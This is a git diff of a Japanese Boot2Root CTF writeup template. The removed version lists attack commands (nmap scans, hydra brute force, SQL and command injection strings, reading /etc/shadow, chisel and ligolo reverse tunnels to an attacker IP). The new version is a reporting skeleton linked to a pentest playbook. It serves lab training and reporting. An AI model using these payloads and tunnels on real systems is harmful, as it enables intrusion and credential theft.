@@ -1,408 +1,320 @@
-# Boot2Root - MachineName  
-（HackTheBox / VulnHub / TryHackMe）
+# 🏆 Boot2Root Writeup Template（Pentest-Playbook 連携版）
 
-この Writeup は 1 台のマシンを  
-Recon → Enumeration → Initial Access → Local Enumeration → Privilege Escalation → Credential Hunting → Internal Enumeration → Pivot / Port Forward → Lateral Movement → Repeat → Root  
-の流れで攻略する Boot2Root 形式の攻略ログです。
+Boot2Root は「実戦ログ」、  
+Pentest-Playbook は「詳細技術体系」という役割分担で記録します。
+
+Boot2Root では **結果と証拠**を記録し、  
+Pentest-Playbook では **技術的背景・体系化された知識**を参照します。
 
 ---
 
-# 🧭 0. Target Info
-- IP: `10.10.x.x`
+## 0. Target Information
+
+- Target IP: `10.10.x.x`
 - OS: Unknown（後で判明）
 - Difficulty: Easy / Medium / Hard
 - Tags: Web / SMB / FTP / SSH / PrivEsc / Pivot / Tunneling / Linux / Windows
 
 ---
 
-# 🎯 1. Recon（初動・外部調査）
+## 1. OSINT  
+👉 詳細: [Pentest-Playbook / OSINT](../../Pentest-Playbook/OSINT/README.md)
 
-外部から見える情報を集め、  
-**「どこから攻められるか」**  
-を把握するフェーズ。
+### 実施内容（Boot2Root は結果のみ）
+- 収集したサブドメイン  
+- メールアドレス  
+- 公開情報  
+- 漏洩情報（あれば）  
 
----
-## 🔎 1.1 Nmap（最重要・鉄板）
-
-### ✔ コマンド
-```
-nmap -p- -T4 -v <TARGET_IP>
-nmap -sC -sV -O -T4 <TARGET_IP>
-nmap --script vuln <TARGET_IP>
-```
-
-### ✔ 出力（証拠）
-```
-[ここに nmap の出力を貼る]
-```
-
-### 🧠 突破口の見つけ方（Nmap）
-- **80/443 → Web（最も突破口が多い）**  
-- **21 → FTP（anonymous / write）**  
-- **22 → SSH（弱パスワード / 鍵）**  
-- **139/445 → SMB（認証情報 / share）**  
-- **3306 → MySQL（弱パスワード）**  
-- **6379 → Redis（未認証）**  
-- **8080/8000/5000 → 内部 Web の可能性**  
-- **古いバージョン → exploit の可能性**
-
+### 証拠
+（スクショ）
 
 ---
 
-## 🌐 1.2 DNS（名前解決の調査）
+## 2. Reconnaissance  
+👉 詳細: [Pentest-Playbook / Reconnaissance](../../Pentest-Playbook/Reconnaissance/README.md)
 
-### ✔ コマンド
-```
-dig A <DOMAIN>
-dig ANY <DOMAIN>
-dig AXFR <DOMAIN> @<TARGET_IP>
-```
+### 実施内容
+- ポートスキャン結果  
+- バナー情報  
+- 外部サービス一覧  
 
-### ✔ 出力（証拠）
-```
-[ここに dig の出力を貼る]
-```
-
-### 🧠 突破口の見つけ方（DNS）
-- サブドメイン → admin / dev / staging  
-- AXFR が通る → 内部情報が大量に漏れる  
+### 証拠
+（スクショ）
 
 ---
 
-## 🧾 1.3 WHOIS（所有者情報）
+## 3. Enumeration  
+👉 詳細: [Pentest-Playbook / Enumeration](../../Pentest-Playbook/Enumeration/README.md)
 
-```
-whois example.com
-```
+### 実施内容
+- Web / SMB / FTP / SSH の詳細調査  
+- ディレクトリ探索  
+- バージョン情報  
+- 脆弱性候補  
 
-### ✔ 出力（証拠）
-```
-[ここに WHOIS の出力を貼る]
-```
-
-### 🧠 突破口の見つけ方（WHOIS）
-- メールアドレス → パスワード推測  
-- 組織名 → OSINT に利用  
+### 証拠
+（スクショ）
 
 ---
 
-## 🌐 1.4 HTTPヘッダ（Webの詳細情報）
+## 4. Initial Access  
+👉 詳細: [Pentest-Playbook / Initial-Access](../../Pentest-Playbook/Initial-Access/README.md)
 
-### ✔ コマンド
-```
-curl -I http://<TARGET_IP>
-```
+### 実施内容
+- SQLi / RCE / File Upload / LFI / SSRF  
+- SMB / FTP / SSH / DB からの侵入  
+- WebShell の設置  
 
-### ✔ 出力（証拠）
-```
-[ここに HTTP ヘッダの出力を貼る]
-```
-
-### 🧠 突破口の見つけ方（HTTPヘッダ）
-- Server: Apache/2.4.29 → 古い  
-- X-Powered-By: PHP/5 → exploit 多い  
-- Location: /admin → 管理画面の存在  
+### 証拠
+（スクショ）
 
 ---
 
-## 🔐 1.5 SSL（証明書情報）
+## 5. Local Enumeration  
+👉 詳細: [Pentest-Playbook / Local-Enumeration](../../Pentest-Playbook/Local-Enumeration/README.md)
 
-### ✔ コマンド
-```
-openssl s_client -connect <TARGET_IP>:443
-```
+### 実施内容
+- whoami / id / hostname  
+- OS / カーネル情報  
+- プロセス / サービス  
+- 認証情報探索  
+- 内部サービスの発見  
 
-### ✔ 出力（証拠）
-```
-[ここに SSL 情報の出力を貼る]
-```
-
-### 🧠 突破口の見つけ方（SSL）
-- CN / SAN → 内部ホスト名  
-- 古い暗号化方式 → 脆弱性の可能性  
+### 証拠
+（スクショ）
 
 ---
 
-## 📁 1.6 SMB（共有フォルダ）
+## 6. Privilege Escalation  
+👉 詳細: [Pentest-Playbook / Privilege-Escalation](../../Pentest-Playbook/Privilege-Escalation/README.md)
 
-### ✔ コマンド
-```
-smbclient -N -L //<TARGET_IP>/
-smbclient //<TARGET_IP>/<SHARE>
-```
+### 実施内容
+- sudo -l  
+- SUID / Capability  
+- Cron  
+- Kernel Exploit  
+- 設定ミスの悪用  
 
-### ✔ 出力（証拠）
-```
-[ここに SMB の出力を貼る]
-```
-
-### 🧠 突破口の見つけ方（SMB）
-- anonymous → 認証不要  
-- .txt / .conf → 認証情報  
-- バックアップファイル → Web の初期侵入  
+### 証拠
+（スクショ）
 
 ---
 
-## 📂 1.7 FTP（ファイルサーバ）
+## 7. Credential Access  
+👉 詳細: [Pentest-Playbook / Credential-Access](../../Pentest-Playbook/Credential-Access/README.md)
 
-### ✔ コマンド
-```
-ftp <TARGET_IP>
-```
+### 実施内容
+- パスワード探索  
+- 設定ファイル  
+- SSH鍵  
+- DB 認証情報  
+- Cookie / Token  
 
-### ✔ 出力（証拠）
-```
-[ここに FTP の出力を貼る]
-```
-
-### 🧠 突破口の見つけ方（FTP）
-- anonymous ログイン
-- 書き込み可能 → WebShell アップロード  
-- Web のソースコード → 脆弱性のヒント  
+### 証拠
+（スクショ）
 
 ---
 
-## 🎯 Recon のまとめ（攻撃の方向性を決める）
+## 8. Internal Enumeration  
+👉 詳細: [Pentest-Playbook / Internal-Enumeration](../../Pentest-Playbook/Internal-Enumeration/README.md)
 
-Recon の目的は **「どこから攻められるか」** を決めること。
+### 実施内容
+- 内部ネットワークの構造  
+- 内部サービス  
+- 内部ホスト  
+- 内部 Web / API  
+- 内部 DB / Redis  
 
-- Web がある → ffuf / SQLi / RCE  
-- SMB がある → 認証情報 → Web/SSH  
-- FTP がある → WebShell アップロード  
-- DB がある → 弱パスワード → 横展開  
-- Redis がある → SSH key 書き込み  
-- ポートが少ない → 内部サービス → pivot 必須  
-
-
----
-
-# 📡 2. Enumeration（外部サービスの詳細調査）
-
-## 2-1. Web
-```
-ffuf -u http://10.10.x.x/FUZZ -w common.txt -e php,txt,bak,old
-curl -I http://10.10.x.x
-```
-
-## 2-2. SMB
-```
-smbclient -N -L //10.10.x.x/
-```
-
-## 2-3. FTP
-```
-ftp 10.10.x.x
-```
-
-## 2-4. SSH
-```
-ssh -v user@10.10.x.x
-```
-
-### 🧠 思考プロセス
-- JS → hidden API / key  
-- robots.txt → 隠しディレクトリ  
-- SMB/FTP → 認証情報が落ちている  
-- Web のユーザー名と SSH が一致する  
+### 証拠
+（スクショ）
 
 ---
 
-# 🚪 3. Initial Access（初期侵入）
+## 9. Pivot  
+👉 詳細: [Pentest-Playbook / Pivot](../../Pentest-Playbook/Pivot/README.md)
 
-## 3-1. Web Exploit
-```
-' OR 1=1-- -
-; cat /etc/passwd
-http://127.0.0.1:80
-```
+### 実施内容
+- SSH Local / Remote / Dynamic  
+- Chisel  
+- Ligolo-ng  
+- ProxyChains  
+- 内部サービスへのアクセス  
 
-## 3-2. 弱パスワード
-```
-hydra -l admin -P rockyou.txt http://10.10.x.x/login
-```
-
-## 3-3. Public Exploit
-```
-searchsploit apache 2.4
-```
-
-### 🧠 思考プロセス
-- 入力欄 → SQLi / RCE  
-- URL 入力欄 → SSRF  
-- Cookie / Header も必ず試す  
+### 証拠
+（スクショ）
 
 ---
 
-# 🖥 4. Local Enumeration（侵入後のローカル調査）
+## 10. Lateral Movement  
+👉 詳細: [Pentest-Playbook / Lateral-Movement](../../Pentest-Playbook/Lateral-Movement/README.md)
 
-```
-id
-whoami
-uname -a
-ls -la
-ps aux
-```
+### 実施内容
+- SSH 横展開  
+- SMB / RDP / VNC  
+- 内部 Web / API  
+- 内部 DB  
+- 内部管理ツール  
 
-### 🧠 思考プロセス
-- 実行中のサービスを確認  
-- Web アプリのソースコードを探す  
-- 認証情報が落ちている可能性  
+### 証拠
+（スクショ）
 
 ---
 
-# 🧗 5. Privilege Escalation（権限昇格）
+## 11. Reporting  
+👉 詳細: [Pentest-Playbook / Reporting](../../Pentest-Playbook/Reporting/README.md)
 
-## 5-1. Linux
-```
-sudo -l
-find / -type f -perm -04000 -ls
-getcap -r /
-```
+この章では、Boot2Root の攻略結果を  
+**Pentest-Playbook の Reporting 体系に沿ってまとめます。**
 
-## 5-2. Windows
-```
-winPEAS.exe
-whoami /priv
-```
-
-### 🧠 思考プロセス
-- sudo -l → 最も突破口率が高い  
-- SUID → find / vim / less / awk  
-- Capabilities → python3 cap_setuid  
+Boot2Root は「実戦ログ」、  
+Pentest-Playbook は「詳細技術体系」という役割分担です。
 
 ---
 
-# 🔑 6. Credential Hunting（認証情報探索）
+### 1. Executive Summary（概要）
 
-```
-grep -Ri "password" /
-grep -Ri "SECRET" /
-cat /etc/passwd
-cat /etc/shadow (権限があれば)
-```
+ターゲットの概要、最終的な侵入結果、取得した権限を簡潔に記述します。
 
-### 🧠 思考プロセス
-- Web アプリの config  
-- DB の接続情報  
-- SSH の鍵  
-- SMB/FTP のパスワード  
+例：
+- 192.168.1.10 に対して OSINT → Recon → Enumeration → Exploitation → PrivEsc → Pivot → Lateral Movement を実施  
+- 最終的に root 権限を取得  
+- 内部ネットワークの 192.168.1.50 に横展開成功  
 
 ---
 
-# 🛰 7. Internal Enumeration（内部ネットワーク探索）
+### 2. Scope（対象範囲）
 
-## 7-1. netstat
-```
-netstat -tunlp
-```
-
-## 7-2. ss
-```
-ss -tunlp
-```
-
-## 7-3. lsof
-```
-lsof -i -P -n
-```
-
-## 7-4. ネットワーク情報
-```
-ip a
-ip route
-```
-
-### 🧠 思考プロセス
-- 127.0.0.1:8000 → 内部 Web  
-- 3306 → MySQL  
-- 6379 → Redis  
-- 複数 NIC → pivot 必須  
+- 対象ホスト  
+- 実施期間  
+- 使用した手法（Blackbox / OSINT / Recon / Enumeration / Exploitation / PrivEsc / Pivot / Lateral Movement）
 
 ---
 
-# 🔁 8. Pivot / Port Forward（内部サービスへのアクセス）
+### 3. Methodology（手法）
 
-## 8-1. SSH Local Forward
-```
-ssh -L 8080:127.0.0.1:8000 user@10.10.x.x
-```
+Pentest-Playbook の各章に対応する形で記述します。
 
-## 8-2. SSH Dynamic Forward（SOCKS）
-```
-ssh -D 9050 user@10.10.x.x
-proxychains curl http://internal:8000
-```
+例：
 
-## 8-3. Chisel
-攻撃者側：
-```
-chisel server -p 9001 --reverse
-```
-
-ターゲット側：
-```
-chisel client attacker_ip:9001 R:socks
-```
-
-## 8-4. Ligolo-ng
-攻撃者側：
-```
-sudo ip tuntap add user tun0 mode tun
-sudo ip link set tun0 up
-ligolo-proxy -selfcert
-```
-
-ターゲット側：
-```
-./agent -connect attacker_ip:11601
-```
-
-### 🧠 思考プロセス
-- 内部 Web → RCE → 横展開  
-- 内部 DB → 認証情報 → SSH  
-- pivot → 内部ネットワーク全体を覗く  
+- OSINT → [Pentest-Playbook / OSINT](../../Pentest-Playbook/OSINT/README.md)  
+- Recon → [Pentest-Playbook / Reconnaissance](../../Pentest-Playbook/Reconnaissance/README.md)  
+- Enumeration → [Pentest-Playbook / Enumeration](../../Pentest-Playbook/Enumeration/README.md)  
+- Initial Access → [Pentest-Playbook / Initial-Access](../../Pentest-Playbook/Initial-Access/README.md)  
+- Local Enumeration → [Pentest-Playbook / Local-Enumeration](../../Pentest-Playbook/Local-Enumeration/README.md)  
+- PrivEsc → [Pentest-Playbook / Privilege-Escalation](../../Pentest-Playbook/Privilege-Escalation/README.md)  
+- Credential Access → [Pentest-Playbook / Credential-Access](../../Pentest-Playbook/Credential-Access/README.md)  
+- Internal Enumeration → [Pentest-Playbook / Internal-Enumeration](../../Pentest-Playbook/Internal-Enumeration/README.md)  
+- Pivot → [Pentest-Playbook / Pivot](../../Pentest-Playbook/Pivot/README.md)  
+- Lateral Movement → [Pentest-Playbook / Lateral-Movement](../../Pentest-Playbook/Lateral-Movement/README.md)  
 
 ---
 
-# 🔀 9. Lateral Movement（横展開）
+### 4. Findings（脆弱性一覧）
 
-```
-ssh user@internal-host
-```
+Boot2Root の攻略結果を一覧化します。
 
-### 🧠 思考プロセス
-- credential reuse  
-- authorized_keys  
-- 内部サービスから別マシンへ  
-
----
-
-# 🔁 10. Repeat（繰り返し）
-
-内部マシンでも同じ流れを繰り返す：
-
-Recon → Enumeration → Initial Access → Local Enum → PrivEsc → Credential Hunting → Internal Enum → Pivot → Lateral Movement
+| ID | 脆弱性 | 重要度 | 影響範囲 |
+|----|--------|--------|-----------|
+| F-01 | SQL Injection | High | 認証バイパス |
+| F-02 | Weak SSH Password | High | 横展開可能 |
+| F-03 | Misconfigured Cron | Medium | PrivEsc 可能 |
 
 ---
 
-# 👑 11. Root（最終攻略）
+### 5. Detailed Findings（脆弱性詳細）
 
+Pentest-Playbook の Reporting 章の構造に合わせて記述します。
+
+##### F-01: SQL Injection（High）
+
+###### ✔ 再現手順
 ```
-uname -a
-searchsploit linux kernel
-cat /root/root.txt
+' OR 1=1 --
 ```
 
-### 🧠 思考プロセス
-- Kernel exploit  
-- cron  
-- sudo misconfig  
-- root 権限で動くサービス  
+###### ✔ 証拠（Screenshots）
+（スクショを貼る）
+
+###### ✔ 影響範囲
+- 認証バイパス  
+- DB ダンプ  
+
+###### ✔ 改善策
+- Prepared Statement  
+- WAF  
 
 ---
 
-# 📝 12. Notes（気づき・学び）
-- このマシンのポイント  
-- 初心者がハマりやすい点  
-- 次に活かせるテクニック  
+#### 6. Attack Path（攻撃経路）
 
+Boot2Root の実戦ログを Pentest-Playbook の Kill Chain に沿って整理します。
+
+例：
+
+```
+OSINT
+↓
+Recon（80, 22）
+↓
+Enumeration（SQLi 発見）
+↓
+Initial Access（WebShell）
+↓
+Local Enumeration（内部 Web 発見）
+↓
+Pivot（8080 → Local）
+↓
+Lateral Movement（SSH鍵取得）
+↓
+PrivEsc（SUID）
+↓
+Root 取得
+```
+
+---
+
+#### 7. Evidence（証拠）
+
+- コマンド結果  
+- WebShell の画面  
+- PrivEsc の証拠  
+- 内部ネットワークの構造  
+- 横展開の証拠  
+
+※ Boot2Root のスクリーンショットをそのまま貼る。
+
+---
+
+#### 8. Recommendations（改善策）
+
+Pentest-Playbook の Reporting 章の改善策を参照しながら記述。
+
+###### ✔ システム側
+- パッチ適用  
+- 不要サービス停止  
+
+###### ✔ ネットワーク側
+- 内部ネットワークのセグメント化  
+- 管理系サービスの外部非公開化  
+
+###### ✔ 運用側
+- パスワードポリシー  
+- ログ監視  
+
+---
+
+#### 9. Appendix（補足）
+
+- 使用ツール一覧  
+- 参考リンク  
+- Pentest-Playbook の該当章一覧  
+
+---
+
+## 🎯 このテンプレートの目的
+
+- Boot2Root の全章が Pentest-Playbook と 1:1 で連携  
+- Boot2Root は「結果」、Pentest-Playbook は「技術体系」  
+- OSCP レポート品質の Writeup を自動的に構築  
+- 将来の章追加にも強い構造  
